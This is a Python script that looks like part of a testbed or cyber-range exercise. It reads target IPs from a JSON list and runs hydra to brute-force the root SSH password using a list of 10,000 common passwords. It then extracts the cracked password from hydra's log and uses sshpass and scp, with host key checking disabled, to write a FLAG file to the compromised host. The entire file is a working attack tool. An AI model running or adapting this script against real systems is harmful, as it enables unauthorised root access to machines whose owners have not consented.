import subprocess
import os
import json

import argparse

def main():
  # Load argparse
  parser = argparse.ArgumentParser(description='Run hydra to crack SSH passwords')
  # Add nodeactor name target of the attack
  parser.add_argument('nodeactor_target', type=str, help='The name of the nodeactor to attack')
  args = parser.parse_args()

  nodeactor_target = args.nodeactor_target
  # Set the log file name
  log_hydra_fname = 'log_hydra.txt'
  # Other examples that could be uncommented
  # log_hydra_fname = 'example_log_hydra.txt'
  # log_hydra_fname = 'example_log_hydra_with_err.txt'

  # Get the target IP from the command line arguments

  # load IP_LIST_DATA from /MENTORED_IP_LIST.json
  with open('/MENTORED_IP_LIST.json', 'r') as f:
    IP_LIST_DATA = json.load(f)

  vulnerable_ips = []
  for nodeactor_name, nodeactor_data in IP_LIST_DATA.items():
    if nodeactor_name != nodeactor_target:
      continue
    for pod in nodeactor_data:
      # find the ip address related to net1
      is_net1 = [x[2]=='net1' for x in pod]
      # find index in is_net1 that is True
      idx = is_net1.index(True)
      ip = pod[idx][0]
      vulnerable_ips.append(ip)

  print(vulnerable_ips)

  for target_ip in vulnerable_ips:
    # Run hydra and redirect output to the log file
    with open(log_hydra_fname, 'w') as log_file:
      subprocess.run(['hydra', '-l', 'root', '-P', '10000_common_passwords', '-s', '22', '-f', target_ip, 'ssh'], 
            stdout=log_file, stderr=subprocess.STDOUT)

    print(f'Finished hydra for {target_ip}')
    # Check for errors in the log file
    with open(log_hydra_fname, 'r') as log_file:
      log_contents = log_file.read()
      if 'ERROR' not in log_contents:
        print(f'No errors in {log_hydra_fname}')

        # Extract password from the log file
        ssh_password = None
        for line in log_contents.splitlines():
          if 'password:' in line:
            ssh_password = line.split('password:')[1].strip()
            break
        
        if ssh_password:
          # Write the password to a file called FLAG
          with open('FLAG', 'w') as flag_file:
            flag_file.write(ssh_password)

          print(f'Found password for {target_ip}: {ssh_password}')        
          # Use sshpass to copy the FLAG file to the target server
          subprocess.run(['sshpass', '-p', ssh_password, 'scp', '-o', 'StrictHostKeyChecking=no', 'FLAG', f'root@{target_ip}:/FLAG'])

if __name__ == '__main__':
  main()